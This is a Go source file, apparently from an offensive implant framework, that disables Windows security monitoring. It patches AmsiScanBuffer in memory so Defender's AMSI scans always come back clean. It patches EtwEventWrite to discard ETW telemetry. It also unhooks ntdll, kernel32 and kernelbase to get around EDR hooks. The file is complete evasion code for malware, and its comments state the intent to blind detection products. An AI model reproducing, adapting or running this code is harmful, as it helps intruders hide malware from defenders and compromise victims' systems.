package evasion

/*
	Phantom Implant Framework - AMSI/ETW Bypass
	Patches AmsiScanBuffer to always return AMSI_RESULT_CLEAN,
	and disables ETW by patching EtwEventWrite to return immediately.
*/

import (
	"fmt"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
)

// PatchAMSI patches amsi.dll's AmsiScanBuffer to always return clean.
// This prevents Windows Defender and other AMSI consumers from scanning
// memory buffers — effectively blinding script/memory-based detection.
func PatchAMSI() error {
	// Load amsi.dll — it may not be loaded yet, force it
	amsi, err := windows.LoadDLL("amsi.dll")
	if err != nil {
		// AMSI not present (non-Windows or stripped system) — not an error
		return nil
	}
	defer amsi.Release()

	proc, err := amsi.FindProc("AmsiScanBuffer")
	if err != nil {
		return fmt.Errorf("AmsiScanBuffer not found: %w", err)
	}

	// Patch: mov eax, 0x80070057 (E_INVALIDARG) ; ret
	// AmsiScanBuffer returns E_INVALIDARG → AMSI_RESULT_CLEAN to caller
	// This is a well-known stable patch that works across all Windows versions.
	patch := []byte{
		0xB8, 0x57, 0x00, 0x07, 0x80, // mov eax, 0x80070057
		0xC3, // ret
	}

	return patchMemory(proc.Addr(), patch)
}

// PatchETW patches ntdll's EtwEventWrite to return immediately (ret 0x14).
// This prevents EDR products that rely on ETW telemetry from seeing
// process activity — including thread creation, memory allocation events.
func PatchETW() error {
	ntdll, err := windows.LoadDLL("ntdll.dll")
	if err != nil {
		return fmt.Errorf("failed to load ntdll: %w", err)
	}
	defer ntdll.Release()

	proc, err := ntdll.FindProc("EtwEventWrite")
	if err != nil {
		return fmt.Errorf("EtwEventWrite not found: %w", err)
	}

	// Patch: xor eax, eax ; ret 0x14
	// Returns STATUS_SUCCESS immediately, discarding all ETW events.
	patch := []byte{
		0x33, 0xC0, // xor eax, eax
		0xC2, 0x14, 0x00, // ret 0x14
	}

	return patchMemory(proc.Addr(), patch)
}

// PatchAll runs all available patches — AMSI + ETW + DLL unhooking.
// Call this once at implant startup when --evasion is enabled.
func PatchAll() {
	// {{if .Config.Debug}}
	log.Println("[evasion] Applying AMSI patch...")
	// {{end}}
	if err := PatchAMSI(); err != nil {
		// {{if .Config.Debug}}
		log.Printf("[evasion] AMSI patch failed: %v\n", err)
		// {{end}}
	}

	// {{if .Config.Debug}}
	log.Println("[evasion] Applying ETW patch...")
	// {{end}}
	if err := PatchETW(); err != nil {
		// {{if .Config.Debug}}
		log.Printf("[evasion] ETW patch failed: %v\n", err)
		// {{end}}
	}

	// Unhook core DLLs that EDR products hook for monitoring
	for _, dll := range []string{
		`C:\Windows\System32\ntdll.dll`,
		`C:\Windows\System32\kernel32.dll`,
		`C:\Windows\System32\kernelbase.dll`,
	} {
		// {{if .Config.Debug}}
		log.Printf("[evasion] Refreshing %s...\n", dll)
		// {{end}}
		if err := RefreshPE(dll); err != nil {
			// {{if .Config.Debug}}
			log.Printf("[evasion] Refresh failed for %s: %v\n", dll, err)
			// {{end}}
		}
	}
}

// patchMemory writes patch bytes to the target address,
// temporarily making the memory region writable.
func patchMemory(addr uintptr, patch []byte) error {
	var oldProtect uint32

	err := windows.VirtualProtect(addr, uintptr(len(patch)),
		windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		return fmt.Errorf("VirtualProtect RWX failed: %w", err)
	}

	// Write patch bytes directly to memory
	mem := unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(patch))
	copy(mem, patch)

	// Restore original protection
	err = windows.VirtualProtect(addr, uintptr(len(patch)), oldProtect, &oldProtect)
	if err != nil {
		return fmt.Errorf("VirtualProtect restore failed: %w", err)
	}

	return nil
}
